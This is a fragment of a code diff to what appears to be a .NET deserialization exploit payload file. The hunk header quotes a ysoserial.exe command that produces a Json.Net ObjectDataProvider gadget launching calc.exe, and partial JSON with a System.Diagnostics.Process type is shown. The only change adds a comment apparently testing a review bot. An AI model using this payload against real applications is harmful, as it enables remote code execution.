@@ -14,3 +14,4 @@ ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
     },
     'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }
+/* just checking code rabbit /*/
